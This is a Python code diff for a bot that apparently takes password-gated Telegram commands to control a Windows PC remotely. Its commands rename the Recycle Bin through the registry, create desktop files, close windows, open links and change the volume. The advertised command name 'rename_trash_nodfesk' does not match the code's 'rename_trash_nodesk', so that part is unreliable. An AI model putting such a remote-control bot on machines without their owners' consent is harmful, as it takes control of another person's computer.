@@ -50,13 +50,14 @@ class Bot:
                 time.sleep(0.01)
         return True
 
-    def rename(self, name):
+    def rename(self, name, arg=0):
         location = winreg.HKEY_CURRENT_USER
         soft = winreg.OpenKey(location, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\')
 
         key_1 = winreg.CreateKey(soft, '{645FF040-5081-101B-9F08-00AA002F954E}')
         winreg.SetValueEx(key_1, '', 0, winreg.REG_SZ, name)
-        self.refresh()
+        if arg == 0: self.refresh()
+        else: pyautogui.press('f5')
 
     def file(self, message):
         fileID = message.photo[-1].file_id
@@ -78,7 +79,8 @@ class Bot:
         if command[0] != self.code: return False
         else:
             if command[1][0] == 'help':
-                bot.send_message(message.chat.id, "1:переименовать мусорку: rename_trash"
+                bot.send_message(message.chat.id, "1:переименовать мусорку когда не рабочий стол: rename_trash_nodfesk"
+                                                  "\n 1.1:переименовать мусорку кокда открыт рабочий стол: rename_trash_desk"
                                                   "\n 2:создать текстовый файл на рабочем столе: creat_txt"
                                                   "\n 3:закрыть все: close_all"
                                                   f"\n 4:пароь: {self.code}"
@@ -88,8 +90,11 @@ class Bot:
                                                   "\n 8:открыть ссылку: open_webbr"
                                                   "\n 9:изменить звук: sound")
                 return True
-            if command[1][0] == 'rename_trash':
-                self.rename(command[1][1])
+            if command[1][0] == 'rename_trash_nodesk':
+                self.rename(command[1][1], arg=0)
+                return True
+            if command[1][0] == 'rename_trash_desk':
+                self.rename(command[1][1], arg=1)
                 return True
             if command[1][0] == 'creat_txt':
                 dir_name = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop")
